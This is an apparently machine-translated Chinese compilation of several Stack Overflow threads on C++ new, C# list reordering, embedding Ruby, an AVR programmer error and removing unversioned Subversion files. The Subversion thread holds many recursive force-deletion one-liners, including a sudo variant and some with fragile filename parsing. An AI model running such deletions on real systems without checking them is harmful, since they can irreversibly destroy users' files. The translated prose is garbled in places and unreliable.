# c++ - 在 C++ 中测试“new”的返回是否有用？

> ID：239302
> 
> 赞同：28
> 
> 时间：2008-10-27T08:00:38.967
> 
> 标签：c++, new-operator

我通常从来没有在 C++ 中看到过新的测试，我想知道为什么。

`Foo *f = new Foo;`

`// f is assumed as allocated, why usually, nobody test the return of new?`

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2008-10-27T08:03:34.653

根据当前标准，*new*永远不会返回*NULL*，而是抛出 std::bad_alloc 。如果您不希望 new 抛出（按照旧标准）而是返回 NULL ，则应该通过使用“ *(std::nothrow)* ”对其进行后缀来调用它。IE

```
Foo* foo = new (std::nothrow) Foo; 
```

当然，如果您有一个非常旧或可能损坏的工具链，它可能不符合标准。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-27T10:37:03.457

这完全取决于您的编译器 VC++ 最高版本 6 如果新运算符失败，则在非 MFC 应用程序上给出 NULL。

现在，当您将 STL 与 VC++ 6 一起使用时，问题会变得更大，因为 STL 符合标准，当他需要获取一些内存时，它永远不会测试 NULL，并猜测在低内存条件下会发生什么......

因此，对于仍然使用 VC++ 6 和 STL 的每个人，请查看这篇文章以获得修复。 [不要让内存分配失败使您的传统 STL 应用程序崩溃](http://msdn.microsoft.com/pt-br/magazine/cc164087(en-us).aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T11:23:12.660

1.  `new`默认抛出`std::bad_alloc`。如果使用默认值，则检查 null 已过时，但必须处理异常。这种默认行为与 C++ 异常安全范式一致——它通常规定对象要么是构造的，要么是未分配的

2.  如果您通过 using 覆盖默认值`new (std::nothrow)`，则需要检查 null。“新建”既分配又提交页面，因此可能会耗尽内存，要么是因为您用完了页面描述符，要么是因为没有可用的物理内存

3.  研究你的操作系统的内存管理。C/C++ 参考机不知道您的操作系统如何管理内存，因此仅依靠语言是不安全的。例如内存分配出错，请阅读 C `malloc()`+ Linux overcommit

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-10-27T08:05:42.263

这完全取决于代码所针对的 C++ 版本。长期以来，c++ 规范已经声明，至少在默认情况下，new 中的失败将导致 c++ 异常，因此任何执行测试的代码都是完全多余的。现在大多数编程也针对虚拟内存操作系统，几乎不可能耗尽内存，而且内存不足的情况是如此致命，以至于让应用程序在下一次 NULL 访问时崩溃是一种很好的方法终止。

只有在嵌入式编程中，异常处理被认为是过多的开销，并且内存非常有限，程序员才会费心检查新的故障。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-10-27T08:06:12.887

[如此](http://en.wikipedia.org/wiki/Operator_new)处所引

“在符合 ISO C++ 标准的编译器中，如果没有足够的内存用于分配，代码将抛出 std::bad_alloc 类型的异常。所有后续代码都将中止，直到错误在 try-catch 块或程序异常退出，程序不需要检查指针的值，如果没有抛出异常，则分配成功。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-27T08:03:55.997

通常没有人测试新代码中 new 的返回，因为 Visual Studio 现在抛出标准所说的方式。

在旧代码中，如果已经进行了黑客攻击以避免抛出，那么您最好还是进行测试。

# c# - 重新排序位置项列表

> ID：239306
> 
> 赞同：5
> 
> 时间：2008-10-27T08:02:52.940
> 
> 标签：c#

我有一个包含批准者列表的请求对象。审批人有姓名和审批职位。

1.  马修
2.  标记
3.  卢克
4.  约翰

最终，一个请求将通过这个链，从 Mathew 开始，到 John 结​​束。

我需要能够重新排序这些允许添加和删除，如下所述。

批准人可以是 -

在某个位置添加 - 即。在位置 3 添加彼得，在这种情况下，新订单将是

1.  马修
2.  标记
3.  彼得
4.  卢克
5.  约翰

删除 - 即。删除标记在这种情况下新订单是

1.  马修
2.  卢克
3.  约翰

已编辑 - 即您可以将 John 的位置更改为 1，在这种情况下，新订单为

1.  约翰
2.  马修
3.  标记
4.  卢克

我提出了许多解决方案，但没有一个是特别优雅的。

任何帮助将非常感激

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-27T08:10:28.167

列表可能有多大？[`List<T>`](http://msdn.microsoft.com/en-us/library/6sh2ey19.aspx)可能是集合的最简单表示，但这意味着每次插入或从列表中间删除时都需要一个副本。“编辑”列表基本上意味着删除/插入。

迭代很简单。

一种替代方法可能是-*如果*您坚持与每个批准者相关联，则[`LinkedList<T>`](http://msdn.microsoft.com/en-us/library/he2s3bh7.aspx)可以使迭代变得简单并且“插入之后”、“之前插入”和“删除”便宜。但是要说“这个审阅者现在应该在第 3 位”并不容易——你必须先迭代才能找到第 3 位（或者无论如何）。如果是“将这个批准者移到这个批准者之后”的情况，那么它是理想的。*[`LinkedListNode<T>`](http://msdn.microsoft.com/en-us/library/d97b9a15.aspx)*

 ** * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-27T08:08:48.077

维护位置属性很痛苦，因为您需要进行大量修改才能更改某些内容（同时保持一切合乎逻辑）。这也使得有效地序列化/反序列化变得困难。

你不能简单地从a`List<T>`或类似的位置推断出位置吗？然后你可以`Add()`到最后，`Insert()`到中间，`Remove()`从任何地方。移动一些东西你只是`Remove()`它和`Insert()`它在你想要的位置？

像这样（格式化为空格）：

```
using System;
using System.Collections.ObjectModel;
using System.Linq;

// I only added this to use a lazier "collection initializer" below,
// which needs an Add(string) method...
class ApproverCollection : Collection<Approver> {
    public void Add(string name) { Add(new Approver(name)); }
}
class Request {
    public Request() { Approvers = new ApproverCollection(); }
    public ApproverCollection Approvers { get; private set; }
}
class Approver {
    public Approver(string name) { Name = name; }
    public string Name { get; set; }
}
static class Program {
    static void Main() {
        Request req = new Request {
            Approvers = {"Mathew", "Mark", "Luke", "John"}
        };
        req.ShowState("Initial");
        req.Approvers.Insert(2, new Approver("Peter"));
        req.ShowState("Inserted Peter");
        Approver mark = req.Approvers.Single(x => x.Name == "Mark");
        req.Approvers.Remove(mark);
        req.ShowState("Removed Mark");
        Approver john = req.Approvers.Single(x => x.Name == "John");
        req.Approvers.Remove(john);
        req.Approvers.Insert(0, john);
        req.ShowState("Moved John");
    }
    static void ShowState(this Request request, string caption) {
        Console.WriteLine();
        Console.WriteLine(caption);
        int pos = 1;
        foreach(Approver a in request.Approvers) {
            Console.WriteLine("{0}: {1}", pos++, a.Name);
        }
    }
} 
```

# c++ - 如何在 C++ 中嵌入 Ruby？

> ID：239315
> 
> 赞同：20
> 
> 时间：2008-10-27T08:10:18.853
> 
> 标签：c++, ruby, scripting, embedded-language

将 Ruby 作为脚本语言嵌入到 C++ 中的最佳方法是什么？使用 ruby​​.h？痛饮？还有什么？我需要向 Ruby 公开一些 C++ 对象，并让 Ruby 解释器评估访问这些对象的脚本。我不在乎扩展 Ruby 或在 C++ 中访问它。

我发现了[这篇关于在 C++ 中嵌入 Ruby 的文章](http://aeditor.rubyforge.org/ruby_cplusplus/index.html)，虽然它非常有用，但它有点老了，我想知道是否有关于该主题的任何其他资源（或类似引擎的开源实现）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-10-27T16:01:45.827

[赖斯](http://jasonroelofs.github.io/rice/)看起来很有希望。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-21T20:12:13.800

Ruby 提供了一个非常有用的 README.EXT 文件。它有很多关于如何扩展 Ruby 以及在 C 和 Ruby 类型之间转换的信息。

也有[摘自](http://www.rubycentral.com/pickaxe/ext_ruby.html)[斧头书](https://rads.stackoverflow.com/amzn/click/com/0974514055)的摘录，几乎涵盖了相同的内容。

就我而言，当我将 Ruby 脚本添加到我的应用程序时，我决定不使用 swig，因为我的需求非常简单，而且我不想再添加另一个构建依赖项。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-27T08:49:22.923

swig 可能是要走的路……但是 ruby​​ 嵌入得不是很好……

如果您想要一种可以很好地嵌入到 C++ 中的语言，请尝试 lua

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-21T21:15:34.617

您可能希望查看[tinyrb](http://code.macournoyer.com/tinyrb/)。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-08-20T16:35:09.343

我一直在研究 Rarity ( [https://github.com/Plaristote/Rarity](https://github.com/Plaristote/Rarity) )，它做了两件事：

*   从 C++ API 的 YML 描述生成 Ruby 绑定
*   允许以大多数 C++ 方式与 Ruby 脚本进行交互

我已经解决了很多问题（异常处理、垃圾收集）……我在其他任何地方都没有见过 Rarity 用来让你的绑定变得生动的代码生成。我还没有看到任何其他库允许在 C++ 和 Ruby 类型之间进行如此简单的转换。

我认为瑞瑞值得一试！我也很高兴收到一些反馈:)！

# computer-science - 有趣的硕士学位课程？

> ID：239320
> 
> 赞同：0
> 
> 时间：2008-10-27T08:15:58.140
> 
> 标签：computer-science

我正在申请明年秋季的硕士学位，想知道是否有人对有趣/具有挑战性的 CS 硕士学位有建议。我认为，尽管选择合适的大学很重要，但更重要的是选择一个硕士学位，在那里你可以找到有才华/有创造力的人来互动和学习。

背景：从未学习过人工智能、离散数学、编译器、操作系统、数据结构、密码学或任何涉及 c/c++ 的课程

寻找：hci 研究和应用，移动技术和社交互动的未来，有形而不是抽象的东西，我可以辅修音乐/艺术/设计的地方

灵感来源：randy pausch、johnny lee、blaise aguera、jeff han、42entertainment 和 jonathan harris (ted.com)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-27T08:34:20.990

> 背景：从未学习过人工智能、离散数学、编译器、操作系统、数据结构、密码学或任何涉及 c/c++ 的课程

嗯……如果你没有学过密码学或人工智能，那就没问题了，但是如果你不了解数据结构、操作系统、编译器等，我不确定你有很多选择可以很好地“硬核” ' 硕士级别的 CS 东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T08:33:44.343

去上一门软件工程课程，你总是可以在工作的时候学习具体的细节，但是了解什么是整体架构，去哪里，什么是一般实践，会让你很好地了解去哪里。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-04-14T21:15:59.947

我建议在社区大学学习线性代数课程，或者至少自学，因为无论你学习什么，你都需要这些材料。这是一个概括，但似乎是真的！

话虽如此，以下是我的想法：

1.  社交互动——至少在我的学校里，目前数据挖掘领域非常重视社交互动。一个常见的事情是查看来自 Twitter 或 Facebook 的数据集，看看你能用它做什么。这个领域严重依赖线性代数和图论，但结果是理论和实践的完美结合。形成社区和人与人之间的协同作用，以及从特定人那里发现有趣的信息或关于特定人的有趣信息是非常可行的，并且看起来你会感兴趣。

2.  HCI - 这是一个巨大的领域。您在寻找哪种 HCI？新的输入法，比如多点触控？计算机视觉，在哪里可以使用摄像头与计算机进行交互？语音识别和合成，以便您可以与您的计算机进行对话？许多 HCI 子领域都依赖于 AI。市场上使用最广泛的 AI 书籍是《[人工智能：一种现代方法》](http://aima.cs.berkeley.edu/)。它可读性极强，我可以推荐它作为开始文本。

我建议看看离你现在所在的地方很近的大学，看看他们在研究生课程中教授什么样的材料。通常，您可以找到研究小组的研讨会，其中包含研究小组在小组会议中涵盖的文献清单。阅读一些论文将使您更好地了解该领域的预期和当前趋势。

祝你好运！

# internet-explorer - InternetExplorer 自动化对象 + PerformanceCounter = 不起作用？

> ID：239323
> 
> 赞同：1
> 
> 时间：2008-10-27T08:21:12.480
> 
> 标签：internet-explorer, automation, performancecounter

我目前正在尝试构建一个应该监视的简单组件，如果用户打开具有特定 URL 的窗口（仅限 IE）。所以我编写了这个组件，一切正常，所以我将它与需要它的应用程序集成在一起。问题是，在这个应用程序中使用了 PerformanceCounters，这些似乎扰乱了 InternetExplorer 自动化对象的行为。

所以我写了这个小示例来演示这个问题：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Diagnostics;
using SHDocVw;

namespace IEHookTest
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread t = new Thread(PerfCounter);
            t.Start();

            URLInterceptor.Instance.StartListening();
            Console.ReadLine();
        }

        private static void PerfCounter()
        {
            PerformanceCounter cpuPc = 
                new PerformanceCounter("Processor", "% Processor Time", "_Total", true);
            do
            {
                float x = cpuPc.NextValue();
                System.Diagnostics.Debug.WriteLine(x);
                Thread.Sleep(50);
            } while (true);
        }
    }

    class URLInterceptor
    {
        private const string DEMANDED_URL = "test";
        private ShellWindows _shellWindows = new ShellWindows();

        public static readonly URLInterceptor Instance = new URLInterceptor();
        private static int _count = 0;
        private URLInterceptor()
        {
        }

        public void StartListening()
        {
            _count++;
            _shellWindows.WindowRegistered -= ShellWindows_WindowRegistered;
            _shellWindows.WindowRegistered += new DShellWindowsEvents_WindowRegisteredEventHandler(ShellWindows_WindowRegistered);
            FindIEs();
        }

        private void FindIEs()
        {
            int count = 0;
            foreach (InternetExplorer browser in _shellWindows)
            {
                browser.NewWindow3 -= browser_NewWindow3;
                browser.NewWindow3 += new DWebBrowserEvents2_NewWindow3EventHandler(browser_NewWindow3);
                count++;
            }
        }

        private void ShellWindows_WindowRegistered(int lCookie)
        {
            FindIEs();
        }

        private void browser_NewWindow3(ref object ppDisp,
                                        ref bool Cancel,
                                        uint dwFlags,
                                        string bstrUrlContext,
                                        string bstrUrl)
        {
            if (!string.IsNullOrEmpty(bstrUrl) && bstrUrl.ToLower().Contains(DEMANDED_URL))
            {
                Cancel = true;
                Console.WriteLine("catched URL: " + bstrUrl);
            }
        }
    }
} 
```

此示例需要对“Microsoft Internet 控件”(SHDocVw) 的引用。要测试示例，只需打开谷歌并搜索“测试”。获取第一个链接并在新选项卡或窗口中打开它。您会看到，有时会引发“NewWindow3”事件，有时不会。但是，如果您注释掉第 15 行（线程开始），对象将按预期工作，并为每个新窗口引发事件。

所以我的问题是，为什么性能计数器会干扰 InternetExplorer 对象，我该如何同时使用它们。我尝试在新的 AppDomain 中运行监视器组件，但这并没有解决问题。仅创建一个新流程是一种解决方案，但出于多种原因，这是我不想做的。

我正在使用 IE 7 在 Win2k3 服务器上进行测试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-11-06T14:40:50.490

To keep the references in an Arraylist solves the problem. Seems that the ShellWindows Collection doesn't hold the references.

# microcontroller - AVR studio4 中的错误消息

> ID：239337
> 
> 赞同：1
> 
> 时间：2008-10-27T08:37:38.033
> 
> 标签：microcontroller, avr-studio4

我最近从 robokits.co.in 购买了一个 AVR USB 编程器，正在尝试使用 AVR studio4 对 atmeg8 进行编程，当我单击程序选项时得到以下信息：

> 执行命令时出现问题。确保您使用正确的编程方法。当前模式是 ISP 验证设备是否放置在正确的插座中，并且 ISP 电缆连接正确。检查主页中指定的编程频率是否远低于设备时钟频率的 1/4。

我已经尝试了所有我能想到的，我检查了连接并且频率低于设备的 1/4。

但这并不能解决这个问题。

我已经制作了闪烁 LED 程序的电路。

[详情请看图片](http://1.bp.blogspot.com/_Fa6w_-W-IXs/SQV9DQ54-1I/AAAAAAAAAIE/1XI3HX5ESRk/s1600-h/a.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-28T13:11:53.550

好吧，这几乎不是解决不同硬件问题的场所。

因此，如果您认为程序员有问题，请联系 www.robokits.com。我会先联系robokits。

由于您甚至无法进入编程模式，因此您可以忽略您的源代码。您应该能够验证熔断器/锁定位，而无需将任何代码编程到 Mega8 中。

在联系 robokits 之前，让您有一个良好的开端：

1\. 按照 robokits 的说明验证编程器已正确安装在您的计算机上。

2\. 验证 Mega8 的引脚 20 和 7 上的 +5Vdc

3\. 验证引脚 22 和 8 是否正确接地。

4\. 验证引脚 1 是否上拉至 +5Vdc（当未连接
编程器时） 编程器尝试连接 Mega8 时应将引脚 1 拉低

5\. 仔细检查编程器与目标之间的所有连接. 由于编程器是一个 10 针 IDC，并且测试电路有一个直插式连接器，因此您必须有一根 IDC 电缆已经断开、剥离并连接到测试电路。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-27T11:49:43.277

仔细检查您正在使用的编程板上的跳线（如果是的话）是否设置正确。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T12:01:00.073

当我在对其他 Atmel 集成电路进行编程时收到类似消息时，我启用了 AVR Studio 4 的 GUI 中存在的“使用外部复位”设置（在 5 中删除并在 Atmel Studio 6 中返回）。

我不确定该选项是否存在或对您的程序员有什么作用，因为我从未使用过它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-27T18:39:35.480

目标是“新鲜的”吗？即从未被编程？无论如何：您尝试过不止一种吗？
在连接编程器之前，您是否对 ISP 头（目标）施加了任何电源？

您可能还想验证您的目标上没有短路拉低 ISP 电源，请参阅下面的引脚分配链接。

如果您的跳线设置是 USB-HID 和慢速 SCK == open && ISP Supply == short 那么您不应该从目标为 ISP 连接供电和供电。

如果您没有为 ISP 头供电和电压，也许您应该尝试一下。移除 ISP 电源跳线并从目标应用的电源向 ISP 接口施加 5V： [AVR ISP Pinout](http://www.hardwarebook.info/AVR_ISP)

ISP 接口上的针脚 2 应参考针脚 10 (gnd) 为 +5Vdc

# svn - 自动删除 Subversion 无版本文件

> ID：239340
> 
> 赞同：114
> 
> 时间：2008-10-27T08:39:35.283
> 
> 标签：svn, build-automation

有人知道递归删除工作副本中不受版本控制的所有文件的方法吗？（我需要这个来在我的自动构建 VMware 中获得更可靠的结果。）

* * *

## 回答 #1

> 赞同：141
> 
> 时间：2008-10-27T08:52:13.277

这在 bash 中对我有用：

```
 svn status | egrep '^\?' | cut -c8- | xargs rm 
```

[Seth Reno](https://stackoverflow.com/users/50225/seth-reno)的更好：

```
svn status | grep ^\? | cut -c9- | xargs -d \\n rm -r 
```

它处理文件名中的未版本化文件夹和空格

根据下面的评论，这只适用于颠覆不知道的文件（状态=？）。subversion知道的任何东西（包括忽略的文件/文件夹）都*不会被删除。*

如果您使用的是 subversion 1.9 或更高版本，您可以简单地使用带有 --remove-unversioned 和 --remove-ignored 选项的[svn cleanup命令](https://subversion.apache.org/docs/release-notes/1.9.html#svn-cleanup-options)

* * *

## 回答 #2

> 赞同：71
> 
> 时间：2009-06-30T14:59:38.450

我在想做同样的事情时遇到了这个页面，虽然不是为了自动构建。

多看几眼后，我在 TortoiseSVN 中发现了“**扩展上下文菜单”。**按住 shift 键并右键单击工作副本。TortoiseSVN 菜单下现在有其他选项，包括“**删除未受版本控制的项目...** ”。

虽然可能不适用于这个特定问题（即在自动构建的上下文中），但我认为它可能对其他希望做同样事情的人有所帮助。

* * *

## 回答 #3

> 赞同：30
> 
> 时间：2008-10-27T08:46:27.547

编辑：

Subversion 1.9.0 引入了一个选项来执行此操作：

```
svn cleanup --remove-unversioned 
```

在此之前，我使用这个 python 脚本来做到这一点：

```
import os
import re

def removeall(path):
    if not os.path.isdir(path):
        os.remove(path)
        return
    files=os.listdir(path)
    for x in files:
        fullpath=os.path.join(path, x)
        if os.path.isfile(fullpath):
            os.remove(fullpath)
        elif os.path.isdir(fullpath):
            removeall(fullpath)
    os.rmdir(path)

unversionedRex = re.compile('^ ?[\?ID] *[1-9 ]*[a-zA-Z]* +(.*)')
for l in  os.popen('svn status --no-ignore -v').readlines():
    match = unversionedRex.match(l)
    if match: removeall(match.group(1)) 
```

它似乎很好地完成了这项工作。

* * *

## 回答 #4

> 赞同：19
> 
> 时间：2009-11-24T12:44:28.167

参见：[svn-clean](http://svn.apache.org/repos/asf/subversion/trunk/contrib/client-side/svn-clean)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2009-10-01T07:19:17.567

如果您在 Windows 命令行上，

```
for /f "tokens=2*" %i in ('svn status ^| find "?"') do del %i 
```

改良版：

```
for /f "usebackq tokens=2*" %i in (`svn status ^| findstr /r "^\?"`) do svn delete --force "%i %j" 
```

如果您在批处理文件中使用它，则需要加倍`%`：

```
for /f "usebackq tokens=2*" %%i in (`svn status ^| findstr /r "^\?"`) do svn delete --force "%%i %%j" 
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2011-08-31T01:34:13.523

我将此添加到我的 Windows PowerShell 配置文件中

```
function svnclean {
    svn status | foreach { if($_.StartsWith("?")) { Remove-Item $_.substring(8) -Verbose } }
} 
```

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2011-05-24T14:30:10.307

Linux命令行：

```
svn status --no-ignore | egrep '^[?I]' | cut -c9- | xargs -d \\n rm -r 
```

或者，如果您的某些文件归 root 所有：

```
svn status --no-ignore | egrep '^[?I]' | cut -c9- | sudo xargs -d \\n rm -r 
```

这是基于肯的回答。（Ken 的回答跳过了被忽略的文件；我的回答删除了它们）。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2013-07-05T14:31:02.280

只需在 unix-shell 上执行以下操作：

```
rm -rf `svn st . | grep "^?" | cut -f2-9 -d' '` 
```

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2008-10-27T08:41:02.910

您不能只导出到新位置并从那里构建吗？

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2010-08-16T12:00:19.040

如果您使用的是 tortoise svn，则有一个隐藏命令可以执行此操作。按住 shift 同时右键单击文件夹以在 Windows 资源管理器中启动上下文菜单。您将获得“删除未受版本控制的项目”命令。

[有关详细信息，请参阅本页](http://tortoisesvn.net/docs/release/TortoiseSVN_en/tsvn-dug-rename.html)底部，或下面的屏幕截图，其中以绿色星标突出显示扩展功能，并以黄色矩形突出显示感兴趣的功能...

[![SVN 扩展上下文菜单与标准菜单](https://i.stack.imgur.com/wmZJI.png)](https://i.stack.imgur.com/wmZJI.png)

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2016-09-14T21:33:19.363

如果你的路径上有[TortoiseSVN](http://tortoisesvn.net/)并且你在正确的目录中：

```
TortoiseProc.exe /command:cleanup /path:"%CD%" /delunversioned /delignored /nodlg /noui 
```

TortoiseSVN 帮助中描述了这些选项`/command:cleanup`：

> 使用 /noui 防止结果对话框弹出，告诉您清理已完成或显示错误消息）。/noprogressui 也禁用进度对话框。/nodlg 禁用显示清理对话框，用户可以在该对话框中选择在清理中应该执行的确切操作。可以使用选项 /cleanup 为状态清除、/revert、/delunversioned、/delignored、/refreshshell 和 /externals 指定可用的操作。

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2018-08-11T18:36:57.173

Subversion 1.9.0 引入了删除未版本化项目的选项 [1]

```
svn cleanup --remove-unversioned 
```

[1] [https://subversion.apache.org/docs/release-notes/1.9.html#svn-cleanup-options](https://subversion.apache.org/docs/release-notes/1.9.html#svn-cleanup-options)

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-10-27T09:01:53.960

我的 Thomas Watnedals Python 脚本的 C# 转换：

```
Console.WriteLine("SVN cleaning directory {0}", directory);

Directory.SetCurrentDirectory(directory);

var psi = new ProcessStartInfo("svn.exe", "status --non-interactive");
psi.UseShellExecute = false;
psi.RedirectStandardOutput = true;
psi.WorkingDirectory = directory;

using (var process = Process.Start(psi))
{
    string line = process.StandardOutput.ReadLine();
    while (line != null)
    {
        if (line.Length > 7)
        {
            if (line[0] == '?')
            {
                string relativePath = line.Substring(7);
                Console.WriteLine(relativePath);

                string path = Path.Combine(directory, relativePath);
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                }
                else if (File.Exists(path))
                {
                    File.Delete(path);
                }
            }
        }
        line = process.StandardOutput.ReadLine();
    }
} 
```

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2014-07-22T20:52:38.753

```
svn st --no-ignore  | grep '^[?I]' | sed 's/^[?I]  *//' | xargs -r -d '\n' rm -r 
```

这是一个 unix shell 命令，用于删除所有不受颠覆控制的文件。

笔记：

*   `st`in是的`svn st`内置别名`status`，即命令等价于`svn status`
*   `--no-ignore`在状态输出中还包括非存储库文件，否则通过诸如此类的机制忽略`.cvsignore`- 因为目标是为构建有一个干净的起点，所以这个开关是必须的
*   `grep`过滤输出，以便只留下 subversion 未知的文件 - 以列表文件开头的行subversion`?`将在没有`--no-ignore`选项的情况下被忽略
*   文件名的前缀是通过`sed`
*   当参数列表为空时，命令`xargs`通过指示`-r`不执行`rm`
*   该`-d '\n'`选项告诉`xargs`使用换行符作为分隔符，这样该命令也适用于带空格的文件名
*   `rm -r`用于需要删除完整目录（不是存储库的一部分）的情况

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2009-04-23T12:16:30.140

如果没有额外的依赖项，我无法让上述任何一项工作，我不想添加到我在 win32 上的自动构建系统中。所以我将以下 Ant 命令放在一起——注意这些需要安装 Ant-contrib JAR（我使用的是最新的 1.0b3 版本和 Ant 1.7.0）。

**请注意，这会删除所有未版本控制的文件而不会发出警告。**

```
 <taskdef resource="net/sf/antcontrib/antcontrib.properties"/>
  <taskdef name="for" classname="net.sf.antcontrib.logic.ForTask" />

  <macrodef name="svnExecToProperty">
    <attribute name="params" />
    <attribute name="outputProperty" />
    <sequential>
      <echo message="Executing Subversion command:" />
      <echo message="  svn @{params}" />
      <exec executable="cmd.exe" failonerror="true"
            outputproperty="@{outputProperty}">
        <arg line="/c svn @{params}" />
      </exec>
    </sequential>
  </macrodef>

  <!-- Deletes all unversioned files without warning from the 
       basedir and all subfolders -->
  <target name="!deleteAllUnversionedFiles">
    <svnExecToProperty params="status &quot;${basedir}&quot;" 
                       outputProperty="status" />
    <echo message="Deleting any unversioned files:" />
    <for list="${status}" param="p" delimiter="&#x0a;" trim="true">
      <sequential>
        <if>
          <matches pattern="\?\s+.*" string="@{p}" />
          <then>
            <propertyregex property="f" override="true" input="@{p}" 
                           regexp="\?\s+(.*)" select="\1" />
            <delete file="${f}" failonerror="true" />
          </then>
        </if>
      </sequential>
    </for>
    <echo message="Done." />
  </target> 
```

对于不同的文件夹，请更改`${basedir}`参考。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2010-12-31T20:20:52.327

```
svn status --no-ignore | awk '/^[I\?]/ {system("echo rm -r " $2)}' 
```

如果您确定要做什么，请删除回声。

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2013-05-30T15:01:16.953

因为其他人都在做...

```
svn status | grep ^? | awk '{print $2}' | sed 's/^/.\//g' | xargs rm -R 
```

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2012-03-28T22:35:07.713

不妨贡献另一种选择

```
svn status | awk '{if($2 !~ /(config|\.ini)/ && !system("test -e \"" $2 "\"")) {print $2; system("rm -Rf \"" $2 "\"");}}' 
```

/(config|.ini)/ 是出于我自己的目的。

将 --no-ignore 添加到 svn 命令可能是个好主意

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2012-04-17T21:59:51.060

我在我的 RH5 机器上偶然发现了 svn-clean。它位于 /usr/bin/svn-clean

[http://svn.apache.org/repos/asf/subversion/trunk/contrib/client-side/svn-clean](http://svn.apache.org/repos/asf/subversion/trunk/contrib/client-side/svn-clean)

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2012-12-22T23:00:25.977

纯windows cmd/bat 解决方案：

```
@echo off

svn cleanup .
svn revert -R .
For /f "tokens=1,2" %%A in ('svn status --no-ignore') Do (
     If [%%A]==[?] ( Call :UniDelete %%B
     ) Else If [%%A]==[I] Call :UniDelete %%B
   )
svn update .
goto :eof

:UniDelete delete file/dir
if "%1"=="%~nx0" goto :eof
IF EXIST "%1\*" ( 
    RD /S /Q "%1"
) Else (
    If EXIST "%1" DEL /S /F /Q "%1"
)
goto :eof 
```

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2014-01-29T20:01:09.797

我已经从[这个答案中尝试了](https://stackoverflow.com/questions/239340/automatically-remove-subversion-unversioned-files/239358#239358)[Seth Reno 的](https://stackoverflow.com/users/50225/seth-reno)版本，但它对我没有用。我在文件名之前有 8 个字符，而不是.`cut -c9-`

所以这是我的版本，`sed`而不是`cut`：

```
svn status | grep ^\? | sed -e 's/\?\s*//g' | xargs -d \\n rm -r 
```

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2015-02-06T03:53:02.377

如果您对 powershell 很满意：

```
svn status --no-ignore | ?{$_.SubString(0,1).Equals("?")} | foreach { remove-item -Path (join-Path .\ $_.Replace("?","").Trim()) -WhatIf } 
```

取出 -WhatIf 标志以使命令实际执行删除。否则，它只会输出在没有 -WhatIf 的情况下运行时*会执行的操作。*

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2017-05-26T10:22:04.717

我会将其添加为对[Thomas Watnedal 答案](https://stackoverflow.com/a/239351/4523777)的评论，但目前还不能。

它的一个小问题（不会影响 Windows）是它只检查文件或目录。对于可能存在符号链接的类 Unix 系统，有必要更改该行：

```
if os.path.isfile(fullpath): 
```

到

```
if os.path.isfile(fullpath) or os.path.islink(fullpath): 
```

也删除链接。

对我来说，将最后一行更改`if match: removeall(match.group(1))`为

```
 if match:
        print "Removing " + match.group(1)
        removeall(match.group(1)) 
```

以便它显示它正在删除的内容也很有用。

根据用例，`?[\?ID]`正则表达式的一部分可能会更好`?[\?I]`，因为它`D`还会删除受版本控制的已删除文件。我想用它来构建一个干净的、签入的文件夹，所以应该没有文件处于`D`状态。

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2018-08-08T14:59:11.033

@zhoufei 我测试了你的答案，这里是更新版本：

```
FOR /F "tokens=1* delims= " %%G IN ('svn st %~1 ^| findstr "^?"') DO del /s /f /q "%%H"
FOR /F "tokens=1* delims= " %%G IN ('svn st %~1 ^| findstr "^?"') DO rd /s /q "%%H" 
```

*   `%`您必须在 G 和 H 前面使用两个标记
*   切换顺序：先删除所有文件，再删除所有目录
*   （可选：）代替`%~1`可以使用任何目录名称，我在 bat 文件中将其用作函数，因此`%~1`是第一个输入参数

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2009-07-31T12:22:18.590

对于喜欢使用 perl 而不是 python、Unix shell、java 等的人。特此提供一个小的 perl 脚本，它也可以执行 jib。

注意：这也会删除所有未版本控制的目录

```
#!perl

use strict;

sub main()

{

    my @unversioned_list = `svn status`;

    foreach my $line (@unversioned_list)

    {

        chomp($line);

        #print "STAT: $line\n";

        if ($line =~/^\?\s*(.*)$/)

        {

            #print "Must remove $1\n";

            unlink($1);

            rmdir($1);

        }

    }

}

main(); 
```

